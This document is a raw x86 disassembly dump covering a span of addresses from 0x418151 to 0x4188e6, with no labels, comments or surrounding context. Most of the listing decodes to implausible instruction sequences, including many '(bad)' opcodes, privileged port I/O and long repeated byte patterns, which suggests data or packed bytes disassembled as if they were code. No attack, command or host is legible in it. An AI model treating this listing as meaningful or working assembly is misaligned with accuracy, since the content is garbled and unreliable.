  418151:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418152:	add    al,BYTE PTR [eax]
  418154:	jmp    0x10adc2fd
  418159:	mov    BYTE PTR [esp+esi*2],ch
  41815c:	leave  
  41815d:	pop    esp
  41815e:	cmp    esi,DWORD PTR [ecx+0x1]
  418161:	stos   DWORD PTR es:[edi],eax
  418162:	xor    DWORD PTR [eax+ebp*4+0x70],edx
  418166:	das    
  418167:	push   ecx
  418168:	or     al,0x5c
  41816a:	inc    edi
  41816b:	push   eax
  41816c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41816d:	jb     0x4181a5
  41816f:	sub    ebx,DWORD PTR [esi+0x2302f3]
  418175:	push   0xffffff94
  418177:	bound  edi,QWORD PTR [eax+0x6b]
  41817a:	push   es
  41817b:	and    DWORD PTR [eax],esi
  41817d:	mov    esi,ds
  41817f:	push   DWORD PTR [ebx+0x3c]
  418182:	icebp  
  418183:	pusha  
  418184:	add    BYTE PTR [ecx],dl
  418186:	in     eax,dx
  418187:	arpl   WORD PTR [esi],bp
  418189:	sbb    al,0xe5
  41818b:	jae    0x41818d
	...
  4181a1:	add    BYTE PTR [edi-0x7cf5f6f3],al
  4181a7:	or     BYTE PTR ds:0x70d36420,al
  4181ad:	jno    0x41820d
  4181af:	or     DWORD PTR [edx],ecx
  4181b1:	and    BYTE PTR [edx],bl
  4181b3:	loope  0x418220
  4181b5:	and    BYTE PTR [edi-0x5f],al
  4181b8:	and    BYTE PTR cs:[esi-0x28f6f5f7],ch
  4181bf:	in     al,dx
  4181c0:	pop    ds
  4181c1:	or     DWORD PTR [esi+0x7d6977e1],ebx
  4181c7:	cli    
  4181c8:	pop    ds
  4181c9:	or     DWORD PTR [esi-0x61cedd62],ebp
  4181cf:	or     eax,0xd3592020
  4181d4:	jae    0x418245
  4181d6:	scas   al,BYTE PTR es:[edi]
  4181d7:	or     eax,0xf59b6f20
  4181dc:	add    al,0xd
  4181de:	hlt    
  4181df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181e0:	popa   
  4181e1:	mov    gs:0xeb20069e,al
  4181e7:	mov    ch,0x1d
  4181e9:	add    dh,ch
  4181eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181ec:	pop    ds
  4181ed:	and    eax,0x201d9fcd
  4181f2:	fisub  WORD PTR [ebp-0x1962ffe3]
  4181f8:	pusha  
  4181f9:	ins    BYTE PTR es:[edi],dx
  4181fa:	rol    BYTE PTR [eax+0x78],cl
  4181fd:	gs (bad) 
  418200:	jae    0x418267
  418202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418203:	push   0x1
  418205:	jno    0x418207
	...
  41821b:	movsx  ebp,WORD PTR ds:0xef9dd46c
  418222:	arpl   WORD PTR [ebx],ax
  418224:	enter  0x6301,0xf
  418228:	pop    esp
  418229:	sub    eax,0x13bef56d
  41822e:	add    ah,BYTE PTR cs:[esi+eiz*1+0x0]
  418233:	aam    0xc6
  418235:	shr    BYTE PTR [edx],cl
  418237:	mov    dl,0xbe
  418239:	shl    BYTE PTR [edi],cl
  41823b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41823c:	stos   DWORD PTR es:[edi],eax
  41823d:	add    DWORD PTR [eax],eax
  41823f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418240:	jl     0x418268
  418242:	inc    edi
  418243:	ret    0x261b
  418246:	jb     0x41821c
  418248:	sub    BYTE PTR [edi],0x5f
  41824b:	mov    ebx,0xce72317e
  418250:	cmp    DWORD PTR [ebx],ebp
  418252:	ins    BYTE PTR es:[edi],dx
  418253:	retf   0x2740
  418256:	add    ah,dl
  418258:	inc    esi
  418259:	cmp    BYTE PTR [ecx-0x7b],ah
  41825c:	fist   DWORD PTR [ecx]
  41825e:	addr16 xchg ecx,eax
  418260:	xor    dh,BYTE PTR [eax]
  418262:	arpl   WORD PTR [eax-0x7daefbc2],cx
  418268:	in     al,dx
  418269:	sub    ebx,DWORD PTR [edi-0x6f]
  41826c:	inc    eax
  41826d:	daa    
  41826e:	dec    esi
  41826f:	mov    bh,dh
  418271:	sub    ah,BYTE PTR [esi+0x6e]
  418274:	fist   DWORD PTR [ecx]
  418276:	addr16 jno 0x41827b
  418279:	xor    BYTE PTR [ebx+0x48],ah
  41827c:	inc    BYTE PTR [ebx]
  41827e:	push   ecx
	...
  418293:	add    BYTE PTR [edx-0x14],al
  418296:	adc    DWORD PTR [ebx+0x46],esp
  418299:	(bad)
  41829d:	add    al,0x27
  41829f:	outs   dx,BYTE PTR ds:[esi]
  4182a0:	push   edi
  4182a1:	popf   
  4182a2:	sub    al,0x76
  4182a4:	dec    esi
  4182a5:	add    dl,bl
  4182a7:	sub    BYTE PTR [edx+0x1f],cl
  4182aa:	out    0x32,eax
  4182ac:	inc    esp
  4182ad:	inc    esp
  4182ae:	enter  0xe22,0xe
  4182b2:	xlat   BYTE PTR ds:[ebx]
  4182b3:	xor    edx,DWORD PTR ds:0x32cbd2a
  4182b9:	push   ds
  4182ba:	(bad)  
  4182bb:	sub    BYTE PTR [edi+0x431cc33],ah
  4182c1:	adc    al,0xb3
  4182c3:	cs cmc 
  4182c5:	sbb    eax,0x110811b7
  4182ca:	nop
  4182cb:	das    
  4182cc:	add    al,0x20
  4182ce:	mov    WORD PTR [ebx],es
  4182d0:	neg    BYTE PTR ds:0x14c62da0
  4182d6:	mov    WORD PTR [esi+edx*8],fs
  4182d9:	sbb    eax,0xeba1898
  4182de:	mov    BYTE PTR [ebx],dh
  4182e0:	mov    ch,0x29
  4182e2:	jne    0x418310
  4182e4:	retf   
  4182e5:	sbb    eax,0x33a7294e
  4182ea:	inc    esp
  4182eb:	inc    ebp
  4182ec:	mov    dh,0x13
  4182ee:	inc    eax
  4182ef:	daa    
  4182f0:	xchg   ecx,eax
  4182f1:	xor    bl,BYTE PTR [ecx+0x2d]
  4182f4:	mov    WORD PTR [ecx],fs
  4182f6:	cmp    DWORD PTR ds:0x0,ebx
	...
  41830c:	add    BYTE PTR [ebx+0x27],bh
  41830f:	push   edx
  418310:	sub    DWORD PTR [ecx+0x32],edi
  418313:	cmp    DWORD PTR ds:0x293b2979,ebp
  418319:	sbb    BYTE PTR ds:0x2a703e7,0xe7
  418320:	add    esp,DWORD PTR [edi-0x58fc18fe]
  418326:	add    ah,bh
  418328:	add    esp,DWORD PTR [edi-0x58fc18fe]
  41832e:	add    ah,bh
  418330:	add    esp,DWORD PTR [edi-0x5b16fffe]
  418336:	add    al,BYTE PTR [eax]
  418338:	jmp    0xe94185e1
  41833d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41833e:	add    al,BYTE PTR [eax]
  418340:	jmp    0xe94185e9
  418345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418346:	add    al,BYTE PTR [eax]
  418348:	jmp    0xe94185f1
  41834d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41834e:	add    al,BYTE PTR [eax]
  418350:	jmp    0xe94185f9
  418355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418356:	add    al,BYTE PTR [eax]
  418358:	jmp    0xe9418601
  41835d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41835e:	add    al,BYTE PTR [eax]
  418360:	jmp    0xe9418609
  418365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418366:	add    al,BYTE PTR [eax]
  418368:	jmp    0xe9418611
  41836d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41836e:	add    al,BYTE PTR [eax]
  418370:	jmp    0x418375
	...
  418385:	add    BYTE PTR [edx+eax*1+0x2a4e900],ah
  41838c:	add    cl,ch
  41838e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41838f:	add    al,BYTE PTR [eax]
  418391:	jmp    0xe941863a
  418396:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418397:	add    al,BYTE PTR [eax]
  418399:	jmp    0xe9418642
  41839e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41839f:	add    al,BYTE PTR [eax]
  4183a1:	jmp    0xe941864a
  4183a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183a7:	add    al,BYTE PTR [eax]
  4183a9:	jmp    0xe9418652
  4183ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183af:	add    al,BYTE PTR [eax]
  4183b1:	jmp    0xe941865a
  4183b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183b7:	add    al,BYTE PTR [eax]
  4183b9:	jmp    0xe9418662
  4183be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183bf:	add    al,BYTE PTR [eax]
  4183c1:	add    BYTE PTR [esi-0x41fffffe],bh
  4183c7:	add    al,BYTE PTR [eax]
  4183c9:	add    dh,cl
  4183cb:	add    al,BYTE PTR [eax]
  4183cd:	add    dh,cl
  4183cf:	add    al,BYTE PTR [eax]
  4183d1:	add    BYTE PTR [esi-0x41fffffe],bh
  4183d7:	add    al,BYTE PTR [eax]
  4183d9:	add    BYTE PTR [esi-0x71fffffe],cl
  4183df:	add    al,BYTE PTR [eax]
  4183e1:	add    BYTE PTR [esi+0x2],bh
  4183e4:	add    BYTE PTR [eax],al
  4183e6:	jle    0x4183ea
	...
  4183fc:	add    BYTE PTR [eax],al
  4183fe:	add    BYTE PTR [esi-0x71fffffe],cl
  418404:	add    al,BYTE PTR [eax]
  418406:	add    BYTE PTR [esi+0x2],bh
  418409:	add    BYTE PTR [eax],al
  41840b:	jle    0x41840f
  41840d:	add    BYTE PTR [eax],al
  41840f:	dec    esi
  418410:	add    al,BYTE PTR [eax]
  418412:	add    BYTE PTR [esi+0x2],cl
  418415:	add    BYTE PTR [eax],al
  418417:	add    al,BYTE PTR ds:[eax]
  41841a:	add    BYTE PTR [esi],bh
  41841c:	add    al,BYTE PTR [eax]
  41841e:	add    BYTE PTR [esi+0x2],cl
  418421:	add    BYTE PTR [eax],al
  418423:	dec    esi
  418424:	add    al,BYTE PTR [eax]
  418426:	add    BYTE PTR [esi],bh
  418428:	add    al,BYTE PTR [eax]
  41842a:	add    BYTE PTR [esi],bh
  41842c:	add    al,BYTE PTR [eax]
  41842e:	add    BYTE PTR [esi],cl
  418430:	add    al,BYTE PTR [eax]
  418432:	add    BYTE PTR [esi],cl
  418434:	add    al,BYTE PTR [eax]
  418436:	add    dh,bh
  418438:	add    DWORD PTR [eax],eax
  41843a:	add    dh,bh
  41843c:	add    DWORD PTR [eax],eax
  41843e:	add    BYTE PTR [esi],cl
  418440:	add    al,BYTE PTR [eax]
  418442:	add    BYTE PTR [esi],cl
  418444:	add    al,BYTE PTR [eax]
  418446:	add    dh,bh
  418448:	add    DWORD PTR [eax],eax
  41844a:	add    dh,bh
  41844c:	add    DWORD PTR [eax],eax
  41844e:	add    BYTE PTR [edi-0x58fffe55],ah
  418454:	stos   DWORD PTR es:[edi],eax
  418455:	add    DWORD PTR [eax],eax
  418457:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418458:	stos   DWORD PTR es:[edi],eax
  418459:	add    DWORD PTR [eax],eax
  41845b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41845c:	stos   DWORD PTR es:[edi],eax
  41845d:	add    DWORD PTR [eax],eax
  41845f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418460:	stos   DWORD PTR es:[edi],eax
  418461:	add    DWORD PTR [eax],eax
	...
  418477:	add    BYTE PTR [edi-0x58fffe55],ah
  41847d:	stos   DWORD PTR es:[edi],eax
  41847e:	add    DWORD PTR [eax],eax
  418480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418481:	stos   DWORD PTR es:[edi],eax
  418482:	add    DWORD PTR [eax],eax
  418484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418485:	stos   DWORD PTR es:[edi],eax
  418486:	add    DWORD PTR [eax],eax
  418488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418489:	stos   DWORD PTR es:[edi],eax
  41848a:	add    DWORD PTR [eax],eax
  41848c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41848d:	stos   DWORD PTR es:[edi],eax
  41848e:	add    DWORD PTR [eax],eax
  418490:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418491:	stos   DWORD PTR es:[edi],eax
  418492:	add    DWORD PTR [eax],eax
  418494:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418495:	stos   DWORD PTR es:[edi],eax
  418496:	add    DWORD PTR [eax],eax
  418498:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418499:	stos   DWORD PTR es:[edi],eax
  41849a:	add    DWORD PTR [eax],eax
  41849c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41849d:	stos   DWORD PTR es:[edi],eax
  41849e:	add    DWORD PTR [eax],eax
  4184a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184a1:	stos   DWORD PTR es:[edi],eax
  4184a2:	add    DWORD PTR [eax],eax
  4184a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184a5:	stos   DWORD PTR es:[edi],eax
  4184a6:	add    DWORD PTR [eax],eax
  4184a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184a9:	stos   DWORD PTR es:[edi],eax
  4184aa:	add    DWORD PTR [eax],eax
  4184ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184ad:	stos   DWORD PTR es:[edi],eax
  4184ae:	add    DWORD PTR [eax],eax
  4184b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184b1:	stos   DWORD PTR es:[edi],eax
  4184b2:	add    DWORD PTR [eax],eax
  4184b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184b5:	stos   DWORD PTR es:[edi],eax
  4184b6:	add    DWORD PTR [eax],eax
  4184b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184b9:	stos   DWORD PTR es:[edi],eax
  4184ba:	add    DWORD PTR [eax],eax
  4184bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184bd:	stos   DWORD PTR es:[edi],eax
  4184be:	add    DWORD PTR [eax],eax
  4184c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184c1:	stos   DWORD PTR es:[edi],eax
  4184c2:	add    DWORD PTR [eax],eax
  4184c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184c5:	stos   DWORD PTR es:[edi],eax
  4184c6:	add    DWORD PTR [eax],eax
  4184c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184c9:	stos   DWORD PTR es:[edi],eax
  4184ca:	add    DWORD PTR [eax],eax
  4184cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184cd:	stos   DWORD PTR es:[edi],eax
  4184ce:	add    DWORD PTR [eax],eax
  4184d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184d1:	stos   DWORD PTR es:[edi],eax
  4184d2:	add    DWORD PTR [eax],eax
  4184d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184d5:	stos   DWORD PTR es:[edi],eax
  4184d6:	add    DWORD PTR [eax],eax
  4184d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184d9:	stos   DWORD PTR es:[edi],eax
  4184da:	add    DWORD PTR [eax],eax
	...
  4184f0:	add    BYTE PTR [edi-0x58fc18fe],ah
  4184f6:	add    ch,al
  4184f8:	out    0x65,al
  4184fa:	sbb    eax,0xa4ec6f60
  4184ff:	lea    edi,[eax+0x2ffd7a0d]
  418505:	xchg   ebp,eax
  418506:	repnz outs dx,DWORD PTR ds:[esi]
  418508:	outs   dx,DWORD PTR ds:[esi]
  418509:	in     al,dx
  41850a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41850b:	call   0x675eeaf6
  418510:	add    al,0x67
  418512:	add    al,BYTE PTR [edi]
  418514:	add    al,0x97
  418516:	add    ch,bh
  418518:	add    ebp,DWORD PTR [ebx-0x67fc16fe]
  41851e:	xchg   esp,eax
  41851f:	out    0x3,eax
  418521:	daa    
  418522:	add    esp,edi
  418524:	add    esp,edi
  418526:	add    ah,bh
  418528:	add    eax,edi
  41852a:	add    ah,bh
  41852c:	add    edx,DWORD PTR [edi-0x60fc18fe]
  418532:	add    ah,bh
  418534:	add    esp,DWORD PTR [ebx-0x5afc18fe]
  41853a:	add    ah,bh
  41853c:	add    ebx,DWORD PTR [eax-0x6c]
  41853f:	out    0x83,eax
  418541:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418542:	add    ah,bh
  418544:	inc    ebx
  418545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418546:	add    ah,bh
  418548:	jecxz  0x41858a
  41854a:	xchg   esp,eax
  41854b:	out    0xf3,eax
  41854d:	cmp    BYTE PTR [edi+eiz*8-0x18fd58f5],dl
  418554:	inc    DWORD PTR [eax]
	...
  41856a:	sub    BYTE PTR [edi+eiz*8-0x18fd58fb],dl
  418571:	add    al,0xa7
  418573:	add    ah,BYTE PTR [edi+0x3]
  418576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418577:	add    ah,BYTE PTR [edi]
  418579:	add    al,0xa7
  41857b:	add    al,BYTE PTR [edi]
  41857d:	add    al,0xa7
  41857f:	add    al,BYTE PTR [eax]
  418581:	fldenv [edx+eax*1+0x2a4e100]
  418588:	add    ch,ch
  41858a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41858b:	add    al,BYTE PTR [eax]
  41858d:	jmp    0x418533
  41858f:	add    al,BYTE PTR [eax]
  418591:	call   0xd141883a
  418596:	hlt    
  418597:	fistp  DWORD PTR [edi]
  418599:	loope  0x41856f
  41859b:	sti    
  41859c:	(bad)  
  41859d:	mov    edi,0xd01edcdb
  4185a2:	mov    bl,0xfc
  4185a4:	(bad)  
  4185a5:	mov    dl,0xda
  4185a7:	jmp    0x9f288cd
  4185ac:	add    ah,BYTE PTR [edx]
  4185ae:	js     0x41859a
  4185b0:	and    BYTE PTR [edi],dl
  4185b2:	jne    0x418599
  4185b4:	and    eax,0x60596ef
  4185b9:	add    al,0x76
  4185bb:	call   0x8b961e2
  4185c0:	add    esi,ebp
  4185c2:	push   0x80cd23e7
  4185c7:	pop    es
  4185c8:	add    al,0x2
  4185ca:	jo     0x4185d6
  4185cc:	add    eax,ebp
	...
  4185e2:	add    BYTE PTR [edx-0x551efa02],ch
  4185e8:	push   es
  4185e9:	push   cs
  4185ea:	ficomp WORD PTR [ebx-0xe]
  4185ed:	adc    bl,dh
  4185ef:	dec    ebx
  4185f0:	cli    
  4185f1:	sbb    ebp,esp
  4185f3:	xor    al,0x9
  4185f5:	adc    eax,0x190138e9
  4185fa:	fbld   TBYTE PTR [edi+0x32ff06ee]
  418600:	or     al,BYTE PTR [ecx]
  418602:	add    BYTE PTR [esi+0x13f30605],ah
  418608:	pop    es
  418609:	inc    DWORD PTR [eax]
  41860b:	cli    
  41860c:	hlt    
  41860d:	and    eax,DWORD PTR [eax]
  41860f:	mov    al,0xb0
  418611:	sbb    ah,BYTE PTR [edi]
  418613:	cld    
  418614:	call   0x3723:0xaea52f1d
  41861b:	lahf   
  41861c:	mov    dl,0x2a
  41861e:	sub    edi,ecx
  418620:	popf   
  418621:	sbb    DWORD PTR [edi],ebx
  418623:	into   
  418624:	xchg   edx,eax
  418625:	inc    BYTE PTR [eax]
  418627:	into   
  418628:	(bad)  
  418629:	(bad)  
  41862a:	(bad)  
  41862b:	mov    esi,0xbafffcfe
  418630:	xchg   edx,eax
  418631:	inc    BYTE PTR [eax]
  418633:	retf   0xfcfe
  418636:	add    dl,cl
  418638:	xchg   edx,eax
  418639:	(bad)  
  41863a:	dec    edx
  41863c:	(bad)  
  41863d:	(bad)  
  41863e:	(bad)  
  41863f:	mov    esi,0x8efffcfe
  418644:	xchg   edx,eax
  418645:	std    
  418646:	inc    DWORD PTR [eax]
	...
  41865c:	mov    ss,WORD PTR [edx-0x6d75ff02]
  418662:	inc    BYTE PTR [eax]
  418664:	jle    0x4185f8
  418666:	std    
  418667:	dec    DWORD PTR [edx-0x75ff026e]
  41866d:	push   es
  41866e:	std    
  41866f:	add    BYTE PTR [esi+0x6],bh
  418672:	add    BYTE PTR [ecx],al
  418674:	jp     0x41867c
  418676:	add    BYTE PTR [eax],al
  418678:	dec    edx
  418679:	xchg   edx,eax
  41867a:	std    
  41867b:	dec    DWORD PTR [esi-0x6e]
  41867e:	std    
  41867f:	add    BYTE PTR [esi],bh
  418681:	xchg   edx,eax
  418682:	std    
  418683:	add    BYTE PTR [esi],bh
  418685:	xchg   edx,eax
  418686:	(bad)  
  418687:	dec    DWORD PTR [esi-0x6e]
  41868a:	(bad)  
  41868b:	dec    DWORD PTR [esi+0x6]
  41868e:	std    
  41868f:	add    BYTE PTR [esi],bh
  418691:	push   es
  418692:	std    
  418693:	add    BYTE PTR [edx],bh
  418695:	xchg   edx,eax
  418696:	std    
  418697:	add    BYTE PTR [edx],cl
  418699:	push   es
  41869a:	std    
  41869b:	jmp    DWORD PTR [edi-0x59fffe61]
  4186a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186a2:	add    DWORD PTR [eax],eax
  4186a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186a5:	lahf   
  4186a6:	add    edi,edi
  4186a8:	add    BYTE PTR [ecx+eax*1-0x2605900],bl
  4186af:	push   eax
  4186b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186b2:	std    
  4186b3:	(bad)  
  4186b4:	call   0xa6418854
  4186b9:	fwait
  4186ba:	add    edi,edi
  4186bc:	fcomp  DWORD PTR [edi+0xfefd]
	...
  4186d2:	add    BYTE PTR [eax],al
  4186d4:	add    BYTE PTR [edi-0x58fffe59],ah
  4186da:	fwait
  4186db:	add    edi,edi
  4186dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186de:	fwait
  4186df:	std    
  4186e0:	(bad)  
  4186e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186e2:	fwait
  4186e3:	add    DWORD PTR [eax],eax
  4186e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186e6:	fwait
  4186e7:	add    DWORD PTR [eax],eax
  4186e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186ea:	fwait
  4186eb:	std    
  4186ec:	jmp    DWORD PTR [eax-0x5800fe59]
  4186f2:	fwait
  4186f3:	add    edi,edi
  4186f5:	nop
  4186f6:	fwait
  4186f7:	std    
  4186f8:	dec    BYTE PTR [eax-0x59fffe61]
  4186fe:	fwait
  4186ff:	std    
  418700:	(bad)  
  418701:	js     0x4186a2
  418703:	add    DWORD PTR [eax],eax
  418705:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418707:	std    
  418708:	jmp    DWORD PTR [edi+0x60fefd9f]
  41870e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41870f:	std    
  418710:	(bad)  
  418711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418712:	lahf   
  418713:	add    edi,edi
  418715:	push   eax
  418716:	fwait
  418717:	add    edi,edi
  418719:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41871a:	lahf   
  41871b:	std    
  41871c:	jmp    DWORD PTR [edi-0x59fffe59]
  418722:	lahf   
  418723:	std    
  418724:	push   DWORD PTR [eax]
  418726:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418727:	std    
  418728:	(bad)  
  418729:	sub    BYTE PTR [edx],al
  41872b:	out    0xff,eax
  41872d:	and    DWORD PTR [edx],eax
  41872f:	jecxz  0x418730
  418731:	sbb    BYTE PTR [ecx+0x210ffe7],dl
  418737:	out    0xff,eax
	...
  41874d:	add    BYTE PTR [eax],cl
  41874f:	add    ah,bh
  418751:	add    esp,DWORD PTR [edi-0x7fc1cfe]
  418757:	nop
  418758:	out    0xff,eax
  41875a:	icebp  
  41875b:	nop
  41875c:	out    0x3,eax
  41875e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41875f:	add    ch,bl
  418761:	add    esp,eax
  418763:	add    edi,eax
  418765:	xor    DWORD PTR [edi-0x587c187e],0xffffff82
  41876c:	out    0x83,eax
  41876e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41876f:	add    al,bh
  418771:	adc    DWORD PTR [edi-0x68fc18fe],0x2
  418778:	mov    DWORD PTR [ebx],0x3c702a7
  41877e:	xchg   edi,eax
  41877f:	add    BYTE PTR [edi],0x84
  418782:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418783:	add    BYTE PTR [edi],0x4
  418786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418787:	add    BYTE PTR [edi],0x84
  41878a:	mov    bh,0x82
  41878c:	out    0x83,eax
  41878e:	mov    bh,0x82
  418790:	out    0x3,eax
  418792:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418793:	and    bh,0x83
  418796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418797:	and    bh,0x3
  41879a:	xchg   edi,eax
  41879b:	add    al,BYTE PTR [edi]
  41879d:	add    al,0xa7
  41879f:	add    al,bh
  4187a1:	add    esi,DWORD PTR [edi-0x487c187e]
  4187a7:	add    al,bh
  4187a9:	add    esi,DWORD PTR [edi-0x587c38fe]
  4187af:	and    bh,0x3
	...
  4187c6:	add    BYTE PTR [edi-0x58fc18fe],ah
  4187cc:	add    BYTE PTR [eax],0xe9
  4187cf:	and    al,0x3
  4187d1:	add    cl,cl
  4187d3:	and    al,0xf3
  4187d5:	(bad)  
  4187d6:	call   0x9c17a7f
  4187db:	mov    ds:0xab08fff2,eax
  4187e0:	add    al,BYTE PTR [eax+0x2a4e9]
  4187e6:	jmp    0x9417b0f
  4187eb:	and    eax,DWORD PTR [ebx]
  4187ed:	add    cl,ch
  4187ef:	and    al,0xf3
  4187f1:	jg     0x4187dc
  4187f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187f4:	bnd jg 0x4187c0
  4187f7:	and    al,0x3
  4187f9:	add    cl,ch
  4187fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187fc:	add    al,BYTE PTR [eax]
  4187fe:	leave  
  4187ff:	and    al,0xf3
  418801:	dec    eax
  418803:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418804:	bnd jg 0x4187f0
  418807:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418808:	repnz dec eax
  41880b:	and    al,0x3
  41880d:	sub    cl,0xa4
  418810:	bnd jg 0x4187fc
  418813:	and    al,0xf3
  418815:	jg     0x418800
  418817:	and    al,0x2
  418819:	add    cl,ch
  41881b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41881c:	bnd jg 0x418808
  41881f:	and    al,0x2
  418821:	or     BYTE PTR [ecx],0xa3
  418824:	add    al,BYTE PTR [eax]
  418826:	or     DWORD PTR [ebx],ebp
  418828:	bnd jg 0x418834
	...
  41883f:	add    BYTE PTR [ebx],ah
  418841:	repnz dec DWORD PTR [eax]
  418844:	stos   DWORD PTR es:[edi],eax
  418845:	add    al,BYTE PTR [eax]
  418847:	jmp    0xe9418a70
  41884c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41884d:	add    al,BYTE PTR [eax+0x224c9]
  418853:	jmp    0xe9c17a7c
  418858:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418859:	repnz (bad) 
  41885b:	jmp    FWORD PTR [esi+0x3]
  41885e:	add    BYTE PTR [eax+0x10036e],al
  418864:	pop    esi
  418865:	add    DWORD PTR [eax],0xffffff80
  418868:	pop    esi
  418869:	add    eax,DWORD PTR [eax]
  41886b:	sub    BYTE PTR [esi+0xe001006],0x83
  418872:	adc    BYTE PTR [eax],al
  418874:	inc    BYTE PTR [edx]
  418876:	add    BYTE PTR [eax],al
  418878:	inc    BYTE PTR [edx-0x79518000]
  41887e:	add    BYTE PTR [eax],al
  418880:	push   cs
  418881:	add    eax,DWORD PTR [eax]
  418883:	sbb    BYTE PTR [esi-0x617feffa],0x86
  41888a:	adc    BYTE PTR [eax+0x1082ce],al
  418890:	(bad)  
  418891:	add    BYTE PTR [eax],al
  418893:	add    BYTE PTR [esi-0x41f7fe00],bh
  418899:	add    al,BYTE PTR [eax]
  41889b:	add    BYTE PTR [esi-0x31f7fdfe],dh
  4188a1:	add    BYTE PTR [eax],al
  4188a3:	or     BYTE PTR [eax],al
	...
  4188b9:	mov    esi,0xc6000002
  4188be:	add    BYTE PTR [edx],al
  4188c0:	add    BYTE PTR [esi-0x69f7fffc],cl
  4188c6:	add    al,BYTE PTR [edx]
  4188c8:	add    BYTE PTR [esi-0x79f7fffe],al
  4188ce:	add    al,BYTE PTR [eax]
  4188d0:	or     BYTE PTR [esi+0x76000202],cl
  4188d6:	add    al,0x2
  4188d8:	or     BYTE PTR [esi+0x7e000202],al
  4188de:	add    al,BYTE PTR [edx]
  4188e0:	or     BYTE PTR [esi+0x4],dl
  4188e3:	add    BYTE PTR [eax],al
  4188e5:	dec    esi
  4188e6:	add    al,BYTE PTR [eax]
